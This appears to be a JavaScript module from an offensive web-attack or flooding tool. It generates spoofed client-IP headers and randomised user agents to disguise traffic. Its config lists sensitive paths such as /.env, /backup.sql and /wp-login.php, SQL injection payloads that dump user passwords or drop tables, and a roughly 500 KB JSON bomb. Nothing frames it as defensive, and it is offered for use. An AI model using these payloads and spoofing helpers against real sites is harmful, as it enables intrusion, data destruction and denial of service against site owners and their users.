// ============================================
// 🔥 REYY.X - IP RANDOMIZER ULTIMATE
// ============================================

class IPRandomizer {
    constructor() {}
    
    generateRandomIPv4() {
        return `${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`;
    }
    
    generateIPByCountry(countryCode) {
        const prefixes = { US:[8,9,10,11], ID:[36,37,38,39], RU:[5,6,7], CN:[1,2,3], JP:[13,14,15], DE:[16,17,18], GB:[19,20,21], FR:[22,23,24], SG:[25,26,27] };
        const prefix = (prefixes[countryCode] || [Math.floor(Math.random()*50)+1])[Math.floor(Math.random() * (prefixes[countryCode]?.length || 1))];
        return `${prefix}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`;
    }
    
    generateFullIPHeaders() {
        const realIP = this.generateRandomIPv4();
        return {
            'X-Forwarded-For': `${this.generateRandomIPv4()}, ${this.generateRandomIPv4()}, ${realIP}`,
            'X-Real-IP': realIP,
            'X-Originating-IP': this.generateRandomIPv4(),
            'X-Remote-IP': this.generateRandomIPv4(),
            'CF-Connecting-IP': this.generateRandomIPv4(),
            'True-Client-IP': this.generateRandomIPv4()
        };
    }
}

const ipRandomizer = new IPRandomizer();

const CONFIG = {
    userAgents: (() => {
        const uas = [];
        const browsers = ['Chrome','Firefox','Safari','Edge','Opera'];
        const oses = ['Windows NT 10.0; Win64; x64','Macintosh; Intel Mac OS X 10_15_7','X11; Linux x86_64','iPhone; CPU iPhone OS 14_0','Android 11; Mobile'];
        for(let i=0;i<200;i++) {
            uas.push(`Mozilla/5.0 (${oses[Math.floor(Math.random()*oses.length)]}) AppleWebKit/537.36 (KHTML, like Gecko) ${browsers[Math.floor(Math.random()*browsers.length)]}/120.0.0.0 Safari/537.36`);
        }
        return uas;
    })(),
    
    locations: (() => {
        const locs = [];
        const countries = ['US','ID','RU','CN','JP','DE','GB','FR','SG'];
        for(let i=0;i<100;i++) {
            locs.push({ country: countries[Math.floor(Math.random()*countries.length)], city: 'City' + i });
        }
        return locs;
    })(),
    
    referers: ['https://google.com','https://bing.com','https://youtube.com','https://facebook.com','https://twitter.com','https://instagram.com','https://github.com','https://reddit.com'],
    
    paths: ['/','/index.php','/index.html','/wp-admin','/admin','/login','/api/v1/users','/api/auth','/.env','/backup.sql','/config.php','/wp-login.php','/xmlrpc.php','/graphql','/cart','/checkout'],
    
    sqlPayloads: ["' OR '1'='1' -- ","' UNION SELECT NULL, username, password FROM users -- ","'; DROP TABLE users; -- ","' AND SLEEP(5) -- "],
    
    jsonBomb: JSON.stringify({ data: 'A'.repeat(500000), array: Array(10000).fill({ x: 'y' }) }),
    
    ipRandomizer: ipRandomizer
};

function randomFromArray(arr) { return arr[Math.floor(Math.random()*arr.length)]; }
function randomString(length=10) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for(let i=0;i<length;i++) result += chars.charAt(Math.floor(Math.random()*chars.length));
    return result;
}
function generateRandomIP() { return ipRandomizer.generateRandomIPv4(); }
function generateGeolocatedIP() { return ipRandomizer.generateIPByCountry(randomFromArray(['US','ID','RU','CN','JP'])); }
function generateIPHeaders() { return ipRandomizer.generateFullIPHeaders(); }
function generateRandomLocation() { return randomFromArray(CONFIG.locations); }

window.generateRandomIP = generateRandomIP;
window.generateGeolocatedIP = generateGeolocatedIP;
window.generateIPHeaders = generateIPHeaders;
window.generateRandomLocation = generateRandomLocation;